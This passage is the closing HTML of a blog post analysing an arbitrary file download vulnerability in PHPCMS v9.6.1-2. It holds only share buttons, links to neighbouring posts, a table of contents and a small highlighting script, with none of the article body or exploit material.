youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Files Download"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-hashtag="Files Download"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/phpcmsv9-6-1-2-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-title="PHPCMSv9.6.1-2 任意文件下载漏洞分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/phpcmsv9-6-0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9.6.0 SQL注入漏洞分析</div>
+          </div>
+        </a><a href="/posts/phpcms-v9-6-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">PHPCMSv9.6.3 文件包含漏洞分析</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#审计">审计</a>
+      <ul>
+        <li><a href="#v961">v9.6.1</a>
+          <ul>
+            <li><a href="#代码审计">代码审计</a></li>
+            <li><a href="#漏洞验证">漏洞验证</a></li>
+          </ul>
+        </li>
+        <li><a href="#v962">v9.6.2</a></li>
+      </ul>
+    </li>
+    <li><a href="#坑点">坑点</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog><script>
+  (function() {
+    var tocLinks = document.querySelectorAll('#TableOfContents a');
+    var headings = document.querySelectorAll('.heading-element');
+    if (!tocLinks.length || !headings.length) return;
+
+    var linkMap = {};
+    tocLinks.forEach(function(a) {
+      var href = a.getAttribute('href');
+      if (href) linkMap[href] = a;
+    });
+
+    var tocLis = document.querySelectorAll('#TableOfContents li');
+    var activeId = null;
+
+    function setActive(id) {
+      if (id === activeId) return;
+      activeId = id;
+
+      var link = linkMap[id];
+      if (!link) return;
+
+      tocLinks.forEach(function(a) { a.classList.remove('active'); });
+      tocLis.forEach(function(li) { li.classList.remove('has-active'); });
+
+      link.classList.add('active');
+      var li = link.closest('li');
+      while (li) {
+        li.classList.add('has-active');
+        var parentUl = li.parentElement;
+        if (!parentUl || parentUl.id === 'TableOfContents') break;
+        li = parentUl.closest('li');
+      }
+    }
+
+    var observer = new IntersectionObserver(function(entries) {
+      var topEntry = null;
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          if (!topEntry || entry.boundingClientRect.top < topEntry.boundingClientRect.top) {
+            topEntry = entry;
+          }
+        }
+      });
+      if (topEntry) {
+        setActive('#' + topEntry.target.id);
+      }
+    }, {
+      rootMargin: '-80px 0px -50% 0px',
+      threshold: 0
+    });
+
+    headings.forEach(function(h) { observer.observe(h); });
+  })();
+  </script></main><footer class="footer">
+  <div class="footer-container"><hr class="footer-divider">
+
+    <div class="footer-row"><div class="footer-social">
+        <a href="https://github.com/L1nq0" target="_blank" rel="noopener noreferrer" class="footer-icon" title="GitHub">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"/>
+          </svg>
+        </a>
+        <a href="mailto:cryp71csec@gmail.com" class="footer-icon" title="Email">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"/>
+            <path d="M3 7l9 6l9 -6"/>
+          </svg>
+        </a>
+      </div><div class="footer-line">
+        <span>Copyright &copy; 2026</span>
+        <span class="footer-sep">|</span>
+        <span>All rights reserved.</span>
+      </div>
+    </div>
+  </div>
+</footer>
+</div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars" aria-hidden="true"></i></div><div class="fixed-button view-comments d-none" role="button" aria-label="View Comments"><i class="fa-solid fa-comment" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/cell-tooltip/cell-tooltip.umd.js" defer></script><script src="/js/config/ae73c2b6b7930080262cb18b1a8b8f24.js" defer></script><script src="/js/theme.min.js" defer></script></body>
+</html>
